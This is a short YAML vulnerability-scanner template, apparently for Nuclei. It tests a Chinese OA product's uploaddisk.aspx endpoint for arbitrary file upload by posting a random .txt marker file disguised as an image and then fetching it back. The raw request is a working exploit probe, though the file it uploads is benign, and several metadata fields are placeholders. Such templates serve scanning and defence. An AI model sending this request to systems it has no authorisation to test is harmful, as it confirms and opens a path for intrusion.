id: zxoa-uploaddisk-upload
info:
  name: Template Name
  author: wangzong
  severity: info
  description: 致翔 OA uploaddisk 存在任意文件上传漏洞
  reference:
    - https://
  tags: tags
variables:
  filename: "{{rand_base(6)}}" 
http:
  - raw:
      - |-
        POST /DocManage/WorkFlow/uploaddisk.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Connection: close
        Content-Length: 195
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryElfcTfs456aUZQAZ
        Accept-Encoding: gzip, deflate, br

        ------WebKitFormBoundaryElfcTfs456aUZQAZ
        Content-Disposition: form-data; name="EDITFILE"; filename="{{filename}}.txt"
        Content-Type: image/png

        123456
        ------WebKitFormBoundaryElfcTfs456aUZQAZ--
      - |+
        GET /{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - '123456'
